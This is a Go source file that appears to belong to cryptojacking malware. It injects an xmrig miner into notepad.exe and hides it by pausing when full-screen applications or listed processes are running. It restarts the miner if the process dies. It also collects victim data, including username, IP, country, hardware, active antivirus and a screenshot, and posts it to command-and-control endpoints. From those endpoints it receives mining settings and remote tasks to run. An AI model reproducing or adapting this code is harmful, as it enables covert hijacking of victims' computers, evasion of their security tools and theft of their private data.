package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

func runChecks() {

	minerinfo := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
	time.Sleep(7 * time.Second)
	fmt.Printf("Miner PID: %d\n", minerinfo.ProcessId)
	for {
		if isForegroundFullScreen() {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}
		if checkProcessesForMatch(processNames) {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}

		running := isProcessRunning(int(minerinfo.ProcessId))
		if !running {
			if checkIdle() {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(true))
				minerinfo = pi
			} else {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
				minerinfo = pi
			}

		} else {
			fmt.Println("Miner running :)")
		}

		time.Sleep(15 * time.Second)
	}
}

func getConfig() {
	for {
		jsonData := map[string]string{
			"pcname":     GetUsername() + "-" + getSystemUUID(),
			"ip":         GetClientIP(),
			"nation":     getNation(),
			"os":         getWindowsVersion(),
			"cpu":        getCPUName(),
			"gpu":        getGPUName(),
			"antivirus":  getActiveAntivirus(),
			"screenshot": string(takeScreenshot()),
		}

		jsonBytes, err := json.Marshal(jsonData)
		if err != nil {
			fmt.Println("Error marshalling JSON:", err)
			continue
		}

		var data []Res
		success := false

		for _, endpoint := range endpoints {
			fmt.Println("Trying endpoint:", endpoint)

			resp, err := http.Post(endpoint, "application/json", bytes.NewReader(jsonBytes))
			if err != nil {
				fmt.Println("Request failed:", err)
				continue
			}
			defer resp.Body.Close()

			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Println("Failed to read response:", err)
				continue
			}

			if err := json.Unmarshal(bodyBytes, &data); err != nil {
				fmt.Println("Failed to parse JSON:", err)
				continue
			}

			if len(data) > 0 {
				success = true
				break
			}
		}

		if !success {
			fmt.Println("All endpoints failed, retrying in 10 seconds...")
			time.Sleep(10 * time.Second)
			continue
		}

		miningpool = data[0].Pool
		mining_wallet = data[0].Address
		mining_password = data[0].Password
		threads = data[0].Threads
		idle_time = data[0].IdleTime
		idlethreads = data[0].IdleThreads
		ssl = data[0].Ssl

		fmt.Println("Task:", data[0].Task)
		go HandleTask(data[0].Task)

		time.Sleep(25 * time.Second)
	}
}
